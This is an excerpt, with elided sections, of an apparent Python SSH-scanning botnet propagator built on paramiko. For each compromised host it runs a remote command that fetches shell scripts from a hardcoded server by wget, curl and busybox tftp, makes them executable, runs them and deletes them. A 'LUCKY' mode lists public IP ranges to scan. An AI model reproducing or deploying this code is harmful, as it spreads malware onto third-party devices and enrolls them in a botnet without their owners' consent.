...
#
# python good2.py 1000 LUCKY 0 1 2 3 4

import threading, paramiko, random, socket, time, sys

paramiko.util.log_to_file("/dev/null")

server_ip = "50.115.164.10"
...
def sshscanner(ip):
    ...
    try:
        ...
        if badserver == False:
                ...
                ssh.exec_command("cd /tmp; wget http://50.115.164.10/gtop.sh || curl -O http://50.115.164.10/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 50.115.164.10 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 50.115.164.10; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh")
...
if sys.argv[2] == "LUCKY":
    ranges = ["122.3.0.0/122.3.255.255", "122.52.0.0/122.54.255.255", "119.93.0.0/119.83.255.255" "14.5.0.0/14.5.255.255", "116.92.0.0/116.92.255.255", "50.227.0.0/50.227.255.255"]
